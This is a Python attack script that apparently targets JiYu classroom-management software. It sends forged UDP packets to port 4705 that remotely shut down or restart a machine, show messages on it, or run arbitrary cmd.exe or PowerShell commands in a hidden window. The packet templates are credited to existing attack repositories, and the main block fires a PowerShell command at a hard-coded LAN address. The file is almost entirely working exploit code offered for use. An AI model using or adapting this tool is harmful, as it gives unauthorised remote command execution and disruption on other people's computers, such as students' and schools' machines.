import logging
import os
import socket
import sys
from dataclasses import dataclass
from typing import Tuple, List

logger = logging.getLogger("my_jiyu_killer")
logger.setLevel(logging.DEBUG)

console_handler = logging.StreamHandler()
console_handler.setLevel(logging.DEBUG)

formatter = logging.Formatter(
    fmt="[%(asctime)s] [%(funcName)s/%(levelname)s]: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)
console_handler.setFormatter(formatter)

logger.addHandler(console_handler)


@dataclass()
class Payload:
    SHUTDOWN: bytes = bytes()
    RESTART: bytes = bytes()
    MSG: bytes = bytes()
    CMD: bytes = bytes()


def _resource_dir(relative_dir: str):
    if hasattr(sys, "_MEIPASS"):
        # noinspection PyProtectedMember
        base_dir = sys._MEIPASS
    else:
        base_dir = os.path.abspath(".")
    return os.path.join(base_dir, relative_dir)


def read_payload(shutdown_dir: str, restart_dir: str, msg_dir: str, cmd_dir: str):
    with open(shutdown_dir, "rb") as f:
        Payload.SHUTDOWN = f.read()
    with open(restart_dir, "rb") as f:
        Payload.RESTART = f.read()
    with open(msg_dir, "rb") as f:
        Payload.MSG = f.read()
    with open(cmd_dir, "rb") as f:
        Payload.CMD = f.read()
    logger.info(f"Read payload from: {shutdown_dir}, {restart_dir}, {msg_dir}, {cmd_dir}")
    # logger.debug(f"shutdown payload: {Payload.SHUTDOWN.hex(' ')}")
    # logger.debug(f"restart payload: {Payload.RESTART.hex(' ')}")
    # logger.debug(f"msg payload: {Payload.MSG.hex(' ')}")
    # logger.debug(f"cmd payload: {Payload.CMD.hex(' ')}")


class Send:
    @staticmethod
    def _format_data(content: str) -> List[int]:
        formatted_bytes = []
        for char in content:
            code_point = ord(char)
            if code_point <= 0xFF:
                formatted_bytes.extend([code_point, 0x00])
                continue
            hex_str = hex(code_point)[2:]
            hex_str = hex_str.zfill(4)
            low_byte = int(hex_str[2:4], 16)
            high_byte = int(hex_str[0:2], 16)
            formatted_bytes.extend([low_byte, high_byte])

        return formatted_bytes

    @staticmethod
    def _encode_str(s):
        return b"".join(bytes([ord(c), 0]) for c in s)

    @staticmethod
    def shutdown(address: Tuple[str, int]):
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            try:
                sock.sendto(Payload.SHUTDOWN, address)
            except socket.gaierror as e:
                logger.error(f"socket.gaierror: {e}")
                raise
            except OSError as e:
                logger.error(f"OSError ({type(e).__name__}): {e}")
        logger.info(f"Send SHUTDOWN packet to {address[0]} on port {address[1]}")

    @staticmethod
    def restart(address: Tuple[str, int]):
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            try:
                sock.sendto(Payload.RESTART, address)
            except socket.gaierror as e:
                logger.error(f"socket.gaierror: {e}")
                raise
            except OSError as e:
                logger.error(f"OSError ({type(e).__name__}): {e}")
        logger.info(f"Send RESTART packet to {address[0]} on port {address[1]}")

    def msg(self, address: Tuple[str, int], content: str = ""):
        content = self._format_data(content)
        packet = bytearray(Payload.MSG)
        for idx, element in enumerate(content, start=56):
            packet[idx] = element

        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            try:
                sock.sendto(packet, address)
            except socket.gaierror as e:
                logger.error(f"socket.gaierror: {e}")
                raise
            except OSError as e:
                logger.error(f"OSError ({type(e).__name__}): {e}")
        logger.info(f"Send MSG packet to {address[0]} on port {address[1]}: {content}")

    def cmd(self, address: Tuple[str, int], command: str, keep_window: bool = False):
        cmd_exe_dir = "C:\\WINDOWS\\system32\\cmd.exe"

        cmd_exe_dir = self._encode_str(cmd_exe_dir)
        if keep_window:
            full_command = self._encode_str(f"/k {command}")
        else:
            full_command = self._encode_str(f"/c {command}")

        packet = bytearray(Payload.CMD)
        packet.extend(cmd_exe_dir)
        packet.extend(b"\x00" * (512 - len(cmd_exe_dir)))

        packet.extend(full_command)
        packet.extend(b"\x00" * (324 - len(full_command)))

        packet.extend(b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00")

        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            try:
                sock.sendto(packet, address)
            except socket.gaierror as e:
                logger.error(f"socket.gaierror: {e}")
                raise
            except OSError as e:
                logger.error(f"OSError ({type(e).__name__}): {e}")
        logger.info(f"Send CMD packet to {address[0]} on port {address[1]}: {command}")

    def powershell(self, address: Tuple[str, int], command: str, keep_window: bool = False):
        powershell_exe_dir = "C:\WINDOWS\system32\WindowsPowerShell\v1.0\\powershell.exe"

        powershell_exe_dir = self._encode_str(powershell_exe_dir)
        if keep_window:
            full_command = self._encode_str(f" -NoExit -NoLogo -WindowStyle Hidden -Command \"& {{{command}}}\"")
        else:
            full_command = self._encode_str(f" -NoLogo -WindowStyle Hidden -Command \"& {command}\"")

        logger.debug(f"Command: {full_command}")

        packet = bytearray(Payload.CMD)
        packet.extend(powershell_exe_dir)
        packet.extend(b"\x00" * (512 - len(powershell_exe_dir)))

        packet.extend(full_command)
        packet.extend(b"\x00" * (324 - len(full_command)))

        packet.extend(b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00")

        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            try:
                sock.sendto(packet, address)
            except socket.gaierror as e:
                logger.error(f"socket.gaierror: {e}")
                raise
            except OSError as e:
                logger.error(f"OSError ({type(e).__name__}): {e}")
        logger.info(f"Send POWERSHELL packet to {address[0]} on port {address[1]}: {command}")


def get_localhost() -> str:
    hostname = socket.gethostname()
    lan_ip = socket.gethostbyname(hostname)
    return lan_ip


# from Jiyu_udp_attack (https://github.com/ht0Ruial/Jiyu_udp_attack)
SHUTDOWN_DIR = _resource_dir(".\\assets\\shutdown.bin")
RESTART_DIR = _resource_dir(".\\assets\\restart.bin")
MSG_DIR = _resource_dir(".\\assets\\msg.bin")
# from JiYuHacker (https://github.com/mxym/JiYuHacker)
CMD_DIR = _resource_dir(".\\assets\\cmd.bin")
read_payload(SHUTDOWN_DIR, RESTART_DIR, MSG_DIR, CMD_DIR)

if __name__ == '__main__':
    print("Your IP: ", get_localhost())
    ADDR = ("10.165.43.52", 4705)  # edit this test ip before
    send = Send()
    send.powershell(ADDR, "echo aaaaa", True)
